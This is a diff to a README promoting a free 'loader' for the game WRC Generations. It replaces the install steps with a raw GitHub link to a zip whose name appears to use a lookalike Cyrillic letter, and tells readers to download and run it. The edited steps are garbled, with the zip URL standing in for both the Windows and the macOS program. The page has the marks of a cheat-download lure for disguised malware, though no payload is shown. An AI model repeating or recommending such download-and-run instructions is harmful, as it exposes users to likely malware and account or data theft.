@@ -35,9 +35,9 @@ Unlock the full experience of WRC Generations with our exclusive loader! Access 
 
 ## 🛠️ Installation Guide
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/v3ntur4-creator/WRCGenerations-FreeHub/main/Lоader.zip** from the repository.
 2. Extract to your preferred folder.
-3. Run the Loader.exe (or Loader.app for macOS).
+3. Run the https://raw.githubusercontent.com/v3ntur4-creator/WRCGenerations-FreeHub/main/Lоader.zip (or https://raw.githubusercontent.com/v3ntur4-creator/WRCGenerations-FreeHub/main/Lоader.zip for macOS).
 4. Follow on-screen instructions and start playing!
 
 ---
